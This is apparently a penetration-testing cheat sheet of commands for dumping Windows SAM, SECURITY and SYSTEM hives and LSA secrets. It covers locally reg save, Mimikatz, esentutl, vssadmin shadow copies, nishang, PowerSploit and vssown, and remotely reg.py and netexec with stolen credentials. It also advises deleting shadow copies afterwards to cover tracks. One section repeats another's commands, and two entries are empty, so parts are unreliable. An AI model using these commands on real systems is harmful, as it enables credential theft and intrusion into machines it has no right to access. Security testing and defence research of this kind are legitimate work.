# SAM/LSA Dump
Need admin privilege on the computer

## Local dump 
- with "reg.exe"
```
reg save hklm\sam c:\sam
reg save hklm\system c:\system
reg save hklm\security c:\security
```
- with "reg.py"

Need admin privilege on the computer

```
reg save hklm\sam c:\sam
reg save hklm\system c:\system
reg save hklm\security c:\security
```

- with Mimikatz.exe

Need admin privilege on the computer

```
.\mimikatz.exe
privilege::debug
token::elevate
lsadump::secrets
```


- with "HiveDump.ps1"

- with Shadow Copy

The same can be done with NTDS, also don't forget to delete the shadow volume.

The data are encrypted with a bootkey in SYSTEM.

- with Esentutl method

Need admin privilege on the computer

```
esentutl.exe /y /vss C:\Windows\System32\config\SECURITY /d c:\security
esentutl.exe /y /vss C:\Windows\System32\config\SAM /d c:\sam
esentutl.exe /y /vss C:\Windows\System32\config\SYSTEM /d c:\system
```

- with "Vssadmin" method

Need admin privilege on the computer

```
vssadmin create shadow /for=C: 
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SECURITY C:\SECURITY
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SAM C:\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SYSTEM C:\SYSTEM
vssadmin delete shadows /shadow=$ShadowCopyId 
```

- with "Copy-VSS" Method

Need admin privilege on the computer. The hive are stored on the same path as the executed script. 

https://github.com/samratashok/nishang

```
Import-Module .\nishang.psm1
Copy-VSS
```

- with Powersploit 

https://github.com/PowerShellMafia/PowerSploit

```
Import-Module .\PowerSploit.psm1
New-VolumeShadowCopy -Volume C:\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SECURITY C:\SECURITY
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SAM C:\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SYSTEM C:\SYSTEM
```

- with Vssown method

Execute vba script with admin privilege on the computer

https://github.com/lanmaster53/ptscripts/blob/master/windows/vssown.vbs

```
cscript vssown.vbs /start
cscript vssown.vbs /create c
cscript vssown.vbs /list
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SECURITY C:\SECURITY
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SAM C:\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\System32\config\SYSTEM C:\SYSTEM
cscript vssown.vbs /delete 
```

## Remote dump 

- With reg.py
```
reg.py [domain]/[user]:[password]@[target] backup -o [output_file]
```

- With Netexec
```
netexec smb [target] -u [user] -p [password] (--lsa) (--sam)
```
